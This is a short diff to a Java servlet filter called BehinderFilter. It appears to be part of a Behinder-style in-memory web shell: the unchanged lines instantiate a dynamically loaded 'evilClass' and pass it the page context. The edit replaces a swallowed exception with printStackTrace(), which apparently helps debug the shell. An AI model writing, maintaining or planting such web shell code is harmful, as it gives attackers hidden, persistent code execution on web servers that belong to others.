@@ -116,7 +116,7 @@ public class BehinderFilter implements Filter {
                 evilClass.getDeclaredConstructor().newInstance().equals(pageContext);
             }
 
-        } catch (Exception ignore) { }
+        } catch (Exception e) { e.printStackTrace(); }
 
         chain.doFilter(request, response);
     }
